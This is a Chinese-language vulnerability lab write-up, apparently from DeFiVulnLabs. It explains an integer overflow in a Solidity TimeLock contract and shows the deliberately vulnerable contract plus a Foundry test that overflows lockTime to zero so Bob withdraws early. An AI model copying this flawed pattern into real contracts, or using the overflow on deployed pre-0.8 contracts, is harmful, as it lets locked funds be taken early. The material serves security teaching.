# 整数溢出
[Overflow.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Overflow.sol)  
**名称：** 整数溢出  
**描述：**  
TimeLock智能合约的代码存在一个缺陷，这个缺陷导致攻击者可以提前从TimeLock合约中提取存入的资金。该漏洞是因为increaseLockTime函数产生溢出，攻击者可以通过溢出来控制锁仓时间，这使攻击者能够在实际的锁仓时间到期之前就提取资金。  


**场景：**     
这个智能合约是为了充当时间保险库  
用户可以将资金存入合约，但是至少要等1周才能取出  
用户还可以在这1周锁仓时间的基础上延长锁仓时间


1. 假设Alice和Bob都有1个以太币 
2. 部署TimeLock合约  
3. Alice和Bob都向TimeLock合约存入1个以太币，他们需要等待1周才能取出存入的以太币  
4. Bob导致他的lockTime溢出，Alice因为时间锁还未到期，所以她不能取出她的存入的这1个以太币。  
5. 因为Bob的lockTime溢出为0了，所以他可以取出他刚刚存入的这1个以太币 

**发生什么了？**  
攻击导致TimeLock.lockTime溢出，并且使得攻击者能够在1周的锁仓时间之前就取出资金。  
Import: 低于0.8的Solidity版本中，没有SafeMath库  

**修复建议：**  
为了解决溢出问题，可以使用SafeMath库或者使用高于0.8的Solidity版本  


**TimeLock 合约：**  
```solidity
contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease; // 漏洞
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(
            block.timestamp > lockTime[msg.sender],
            "Lock time not expired"
        );

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
```  
**如何测试：**  
forge test --contracts src/test/Overflow.sol -vvvv  
```solidity
// 这个testOverflow 函数, 用于测试溢出漏洞
    function testOverflow() public {
        // 记录Alice的余额
        console.log("Alice balance", alice.balance);
        // 记录Bob的余额
        console.log("Bob balance", bob.balance);

        // 记录"Alice存入1个以太币"
        console.log("Alice deposit 1 Ether...");
        // 将消息发送者设置为Alice
        vm.prank(alice);
        // Alice向TimeLock合约存入1个以太币
        TimeLockContract.deposit{value: 1 ether}();
        // 记录Alice的新余额
        console.log("Alice balance", alice.balance);

        // 记录"Bob存入1个以太币"
        console.log("Bob deposit 1 Ether...");
        // 将消息发送者设置为Bob
        vm.startPrank(bob);
        // Bob向TimeLock合约存入1个以太币
        TimeLockContract.deposit{value: 1 ether}();
        // 记录Bob的新余额
        console.log("Bob balance", bob.balance);

    
        //漏洞利用：增加锁定时间，使其溢出并变为0。
        TimeLockContract.increaseLockTime(
            type(uint).max + 1 - TimeLockContract.lockTime(bob)
        );

        // 记录"Bob将成功取款，因为锁定时间已溢出"。
        console.log(
            "Bob will successfully withdraw, because the lock time is overflowed"
        );
        // Bob取款
        TimeLockContract.withdraw();
        // 记录Bob的新余额
        console.log("Bob balance", bob.balance);
        // 停止Bob的攻击
        vm.stopPrank();

        // 记录Alice的攻击
        vm.prank(alice);
        // 记录"Alice将无法取款，因为锁定时间尚未到期"。
        console.log(
            "Alice will fail to withdraw, because the lock time did not expire"
        );
        //尝试取款Alice的资金。由于锁定时间尚未到期，这应该会导致回滚。
        TimeLockContract.withdraw(); // 预期会回滚
    }
```  
**红色框：** TimeLock.lockTime发生溢出  
**紫色框：** 溢出已修复
![Alt text](image.png)